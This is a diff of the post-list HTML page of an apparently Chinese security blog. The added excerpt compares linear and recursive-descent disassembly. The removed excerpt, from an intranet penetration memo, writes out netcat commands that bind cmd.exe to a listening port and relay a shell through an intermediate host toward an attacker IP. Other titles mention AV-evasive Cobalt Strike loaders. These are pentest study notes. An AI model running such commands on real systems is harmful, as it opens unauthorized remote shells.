@@ -38,6 +38,28 @@
                 <div class="post-list">
     
     <div class="post">
+        <a class="post-title" href="/2024/11/17/%E5%AF%B9%E6%8A%97%E5%8F%8D%E6%B1%87%E7%BC%96/"></a>
+        <div class="post-except">
+            反汇编算法
+线性反汇编
+
+具体原理：从一个代码段的第一个字节开始，以线性模式扫描整个代码段，逐条反汇编每条指令，直到完成整个代码段。
+优点：能够完全覆盖程序的所有代码段。
+缺点：没有考虑到代码中可能混有数据。
+主要工具：GDB
+
+面向代码流的反汇编，也被称做递归下降反汇编算法
+
+具体原理：递归下降算法强调控制流的概念。控制流根据一条指令是否被另一条指令引用来决定是否对其进行反汇编。
+优点：具有区分代码与数据的强大能力。
+缺点：无法处理间接代码路径。
+主要工具：IDA、wind
+            <a class="read-more" href="/2024/11/17/%E5%AF%B9%E6%8A%97%E5%8F%8D%E6%B1%87%E7%BC%96/"> ... </a>
+        </div>
+        <div class="post-date">2024.11.17</div>
+    </div>
+    
+    <div class="post">
         <a class="post-title" href="/2024/11/15/Anti-virtualization%EF%BC%88%E9%99%84CVE-2024-37081%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%EF%BC%89/">#Anti-virtualization（附CVE-2024-37081漏洞解析）</a>
         <div class="post-except">
             
@@ -188,25 +210,6 @@ CS 分离免杀上线首先cs上生成raw格式的木马，然后使用加载器
             <a class="read-more" href="/2022/08/05/Medium-Socialnetwork-%E9%9D%B6%E5%9C%BA/"> ... </a>
         </div>
         <div class="post-date">2022.08.05</div>
-    </div>
-    
-    <div class="post">
-        <a class="post-title" href="/2022/05/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%A4%87%E5%BF%98%E5%BD%95/">#内网渗透备忘录</a>
-        <div class="post-except">
-            0x00 前言接触安全数月有余，整理一下内网学习笔记。
-0x01 内网穿透#nc内网穿透&#x2F;&#x2F;攻击机执行
-nc -lvp 3333
-
-&#x2F;&#x2F;目标机执行
-nc -lvp 3333 -e c:\windows\system32\cmd.exe
-
-&#x2F;&#x2F;中间机执行  
- nc -v 攻击机ip 3333 -e “nc -v 目标机ip 3333”
-
-#frp内网穿透配置&#x2F;&#x2F;内网机器上安装frpc，并修改 fr
-            <a class="read-more" href="/2022/05/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%A4%87%E5%BF%98%E5%BD%95/"> ... </a>
-        </div>
-        <div class="post-date">2022.05.22</div>
     </div>
     
 </div>
